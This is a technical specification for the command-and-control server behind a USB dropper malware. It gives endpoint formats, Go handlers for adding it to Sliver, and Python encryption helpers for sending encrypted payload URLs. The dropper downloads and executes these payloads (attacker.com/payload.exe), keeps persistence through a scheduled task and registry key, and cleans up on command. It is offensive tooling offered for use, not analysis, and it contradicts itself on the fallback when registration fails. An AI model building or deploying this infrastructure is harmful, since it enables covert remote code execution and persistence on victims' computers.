# C2 Server Requirements (Phase 2)

**Version:** 2.0  
**Protocol:** HTTP(S) with XOR + AES-GCM encryption  
**Target Server:** Sliver C2 (HTTP listener) or custom implementation

---

## Overview

USB dropper communicates with C2 server via HTTP endpoints. This document specifies what the server MUST implement for dropper to function.

**Dropper lifecycle:**
```
Client: /health (test connectivity)
  ↓
Client: /register (negotiate encryption key)
  ↓
Client: /command (polling loop, 5-60s backoff)
  ↓
Server: payload URL or DELETE command
  ↓
Client: download + execute or cleanup
```

---

## Endpoints

### 1. `/health` (Required)

**Purpose:** Health check. Verify C2 is online before attempting registration.

**Request:**
```
GET /health HTTP/1.1
Host: c2-server:8080
Timeout: 3 seconds
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: text/plain

OK
```

**Requirements:**
- Must respond with HTTP 200
- Body ignored by client
- Fast response (target: <100ms)

**Dropper behavior:**
- Called once at startup (Dropper.Run())
- If fails: exit immediately (no persistence installed)
- If succeeds: proceed to /register

---

### 2. `/register` (Required)

**Purpose:** Client registers with C2, server negotiates encryption key.

**Request:**
```
POST /register?host=DESKTOP-ABC123 HTTP/1.1
Host: c2-server:8080
Content-Type: application/json
Timeout: 5 seconds

""
```

**Parameters:**
- `host` (query string): Target hostname (e.g., DESKTOP-ABC123, WORKSTATION-001)
- Body: Empty string or `{}` (reserved for v3)

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "key": "YWJjZGVmZ2hpamtsbW5vcA==",
  "method": "aes|xor",
  "backoff": 5,
  "commands_enabled": true
}
```

**Response fields:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `key` | string | Yes | Base64-encoded AES-256 key (32 bytes = 44 chars in base64) OR XOR key (min 16 bytes) |
| `method` | string | No | Encryption: "aes" (AES-256-GCM) or "xor" (default). If missing, client uses XOR fallback |
| `backoff` | integer | No | Initial polling backoff in seconds (default: 5). Client caps at 60s |
| `commands_enabled` | boolean | No | If false, client polls but ignores responses (reserved for future use) |

**Example key generation (Python):**
```python
import base64
import secrets

# Generate 256-bit AES key
aes_key = secrets.token_bytes(32)
key_b64 = base64.b64encode(aes_key).decode()

response = {
    "key": key_b64,
    "method": "aes",
    "backoff": 5
}
```

**Requirements:**
- Server must track keys per hostname (may encrypt/decrypt per-target)
- Key must be valid base64
- AES keys: exactly 32 bytes (256-bit)
- XOR keys: minimum 16 bytes
- Response must be valid JSON

**Dropper behavior:**
- Extracts `key` from response, decodes base64
- Stores key in memory (NOT persisted to disk)
- Updates `encryptionMethod` if provided
- If register fails: exit (no fallback)

---

### 3. `/command` (Required)

**Purpose:** Client polls for commands; server sends encrypted payload or control signal.

**Request:**
```
GET /command?host=DESKTOP-ABC123 HTTP/1.1
Host: c2-server:8080
Timeout: 5 seconds

[no body]
```

**Parameters:**
- `host` (query string): Hostname (must match registration)

**Response:**
```
HTTP/1.1 200 OK
Content-Type: text/plain

aGSQ3Jk8mNp2+tYvWxZa...  [base64 encrypted data]
```

**Response body formats accepted:**

#### A. Empty response (no command)
```
HTTP/1.1 200 OK
Content-Length: 0

```

**Dropper action:** Wait, poll again in 5-60s (no change to backoff)

#### B. DELETE command (cleanup)
```
aGSQ3Jk8...  [base64(XOR/AES(plaintext="DELETE"))]
```

**Dropper action:**
1. Decrypt → receive plaintext "DELETE"
2. Exit process
3. Scheduled task auto-removes itself
4. Registry key auto-removes itself
5. Cleanup logs

#### C. Payload URL
```
aGSQ3Jk8...  [base64(XOR/AES(plaintext="http://attacker.com/payload.exe"))]
```

**Dropper action:**
1. Decrypt → receive URL
2. Download to `$env:TEMP\[random].exe`
3. Execute: `& $temp.exe`
4. Delete temp file
5. Continue polling

#### D. PowerShell command (reserved, not yet implemented)
```
aGSQ3Jk8...  [base64(XOR/AES(plaintext="powershell -Command 'Get-Process'"))]
```

**Requirements:**
- All responses must be base64-encoded and encrypted
- Encryption method determined during /register (XOR or AES)
- Plaintext options: empty string, "DELETE", URL (http/https), future: PowerShell commands
- No authentication headers required
- Server can ignore hostname in query (informational only)
- HTTP 404, 500, timeout: client treats as "no command" (exponential backoff)

**Encryption details:**

**XOR (v1, fallback):**
```
plaintext_bytes = UTF8.GetBytes(plaintext)
key_bytes = UTF8.GetBytes(key)
ciphertext = XOR(plaintext_bytes, key_bytes)
response_body = Base64Encode(ciphertext)
```

Example (Python):
```python
import base64

def xor_encrypt(plaintext, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    plain_bytes = plaintext.encode() if isinstance(plaintext, str) else plaintext
    cipher = bytes(plain_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(plain_bytes)))
    return base64.b64encode(cipher).decode()

# Usage:
encrypted = xor_encrypt("DELETE", "stealth-key-123")
# → Send as HTTP response body
```

**AES-GCM (v2, preferred):**
```
IV = random 96-bit (12 bytes)
ciphertext = AES256_GCM_Encrypt(plaintext, key, IV)
auth_tag = GCM_compute_tag(key, IV, ciphertext)
response_body = Base64Encode(IV + ciphertext + auth_tag)
```

Example (Python):
```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def aes_gcm_encrypt(plaintext, key):
    key_bytes = base64.b64decode(key) if isinstance(key, str) else key
    plain_bytes = plaintext.encode() if isinstance(plaintext, str) else plaintext
    
    iv = os.urandom(12)
    cipher = AESGCM(key_bytes)
    ciphertext = cipher.encrypt(iv, plain_bytes, None)
    
    return base64.b64encode(iv + ciphertext).decode()

# Usage:
encrypted = aes_gcm_encrypt("http://attacker.com/shell.exe", aes_key_b64)
# → Send as HTTP response body
```

---

## Polling Behavior (Client-side)

```
Initial: GET /health
  ↓ success
  ↓
  POST /register → get key
  ↓ success
  ↓
while (true) {
  backoff = 5
  
  loop {
    wait backoff seconds
    GET /command?host=HOSTNAME
    
    if timeout or error:
      backoff = min(backoff * 2, 60)  # exponential backoff cap 60s
      continue
    
    if empty response:
      backoff = 5  # reset on success
      continue
    
    if "DELETE":
      exit + cleanup
    
    if "http*":
      download + execute
      backoff = 5
      continue
    
    if empty:
      backoff = 5
      continue
  }
}
```

**Timing:**
- Initial: 5-60s jitter (random, to avoid synchronization)
- Success: reset to 5s
- Error: exponential 5→10→20→40→60s (cap at 60s)
- Total window: 5s to 60s between polls

---

## Sliver-Specific Implementation

For Sliver C2 HTTP listener:

**1. Add `/health` handler:**
```go
// Sliver: handlers/health.go
func HealthHandler(w http.ResponseWriter, r *http.Request) {
    w.WriteHeader(http.StatusOK)
    w.Write([]byte("OK"))
}
```

**2. Add `/register` handler:**
```go
// Sliver: handlers/register.go
func RegisterHandler(w http.ResponseWriter, r *http.Request) {
    hostname := r.URL.Query().Get("host")
    if hostname == "" {
        http.Error(w, "missing host", http.StatusBadRequest)
        return
    }
    
    // Generate per-target key
    key := generateAES256Key()  // Returns 32 bytes
    keyB64 := base64.StdEncoding.EncodeToString(key)
    
    // Store key in database: targets[hostname] = key
    storeTargetKey(hostname, key)
    
    response := map[string]interface{}{
        "key": keyB64,
        "method": "aes",
        "backoff": 5,
        "commands_enabled": true,
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
}
```

**3. Add `/command` handler:**
```go
// Sliver: handlers/command.go
func CommandHandler(w http.ResponseWriter, r *http.Request) {
    hostname := r.URL.Query().Get("host")
    
    // Fetch command from queue: commands[hostname]
    cmd := getNextCommand(hostname)
    
    if cmd == "" {
        w.WriteHeader(http.StatusOK)
        return  // Empty response = no command
    }
    
    // Fetch encryption key
    key := getTargetKey(hostname)
    
    // Encrypt (AES-GCM)
    encrypted := encryptAESGCM(cmd, key)
    
    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    w.Write([]byte(encrypted))
}
```

---

## Testing

**Test sequence (using curl):**

```bash
# 1. Health check
curl -v http://c2:8080/health
# Expected: 200 OK

# 2. Register
curl -X POST http://c2:8080/register?host=TEST-HOST
# Expected: {"key": "...", "method": "aes", "backoff": 5}

# 3. Poll (no command)
curl http://c2:8080/command?host=TEST-HOST
# Expected: 200 OK (empty body)

# 4. Poll (with DELETE, encrypted)
# Set up server to return encrypted "DELETE"
curl http://c2:8080/command?host=TEST-HOST
# Expected: base64-encoded encrypted "DELETE"
```

---

## Security Notes

⚠️ **Important:**
- All responses must be encrypted (XOR minimum, AES preferred)
- No plaintext commands in HTTP body
- HTTPS recommended (not required for lab, but production should use HTTPS + pinning)
- Keys should be unique per hostname
- Rotate keys between campaigns
- Implement command rate-limiting (max 1 command per 5 seconds per target)
- Log all /register calls (indicator of compromise)
- Monitor /command endpoints for unusual patterns

---

## Backward Compatibility

**v1.0 (current):**
- XOR-only encryption
- Hardcoded key: "stealth-key-123"
- No /register endpoint

**v2.0 (Phase 2):**
- Key negotiation via /register
- XOR + AES support
- Per-target keys

**Upgrade path:**
1. Server implements /register, issues keys (AES or XOR fallback)
2. Client calls /register before polling
3. If /register fails: client falls back to XOR + hardcoded key
4. Old dropper (v1.0) continues working (registers fails silently, uses XOR)

---

**Last Updated:** 2026-10-15  
**Document Version:** 2.0  
**Status:** APPROVED
